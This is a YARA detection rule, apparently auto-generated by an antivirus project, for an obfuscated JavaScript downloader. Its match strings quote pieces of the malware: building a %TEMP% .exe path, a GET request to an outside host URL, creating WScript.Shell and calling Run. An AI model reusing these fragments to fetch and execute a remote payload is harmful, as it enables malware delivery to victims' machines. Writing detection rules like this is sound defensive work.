rule sig_20160328_b89c2ecec09017e886729124ff74c4ca {
  meta:
    description = "datamaliciousorder - file 20160328_b89c2ecec09017e886729124ff74c4ca.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8e50121e91da5cd27581d519922a0455455e3cdf6cf1a0faff7b21d6218ccadc"

  strings:
    $s1  = "function Wlbvlyeqi() {return Iacxdvjm[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"UxTGSti3.exe\";};" fullword ascii
    $s2  = "Cvuqjh[Vjocywblce](\"GET\", \"http://teknosolar.com/xw3ika\", false);" fullword ascii
    $s3  = "function Wagspia(Ouugirn, Uriynhrat){return Ouugirn - Uriynhrat;};" fullword ascii
    $s4  = "do {WScript[Jjirplsdyj](Jsctkgr() * 11)} while (Cvuqjh[\"readystate\"] < 2 * 2);" fullword ascii
    $s5  = "var Iacxdvjm = function Beaadi() {return WScript[Runvqyha](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Myawip() {return ((Pffkp == true) && (Pffkp == Agtjzrv)) ? 1 : Bmyjluwi;};" fullword ascii
    $s7  = "function Ylobnhd(){return Runvqyha;};" fullword ascii
    $s8  = "function Quyguxz(Gjsyc){Iacxdvjm[\"Run\"](Gjsyc, Bmyjluwi, Bmyjluwi);};" fullword ascii
    $s9  = "function Ykwwen(Ncfritly) {var Dtqazsjew = (1, 2, 3, 4, 5, Ncfritly); return Dtqazsjew;};" fullword ascii
    $s10 = "var Kbhhn = false;" fullword ascii
    $s11 = " while (Tqertmi){" fullword ascii
    $s12 = "return Wagspia(Ouvnvbjih, Zrnezwazdq);" fullword ascii
    $s13 = "Agtjzrv = true; " fullword ascii
    $s14 = "var Ennsmin = new this[\"Date\"]();" fullword ascii
    $s15 = "function Rspgig()" fullword ascii
    $s16 = "var Pffkp = false;" fullword ascii
    $s17 = "var Agtjzrv = false;" fullword ascii
    $s18 = "function Jsctkgr(){return 22;};" fullword ascii
    $s19 = "Pffkp = true; " fullword ascii
    $s20 = "function Uymtvwh(){return Cafqwxkl;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}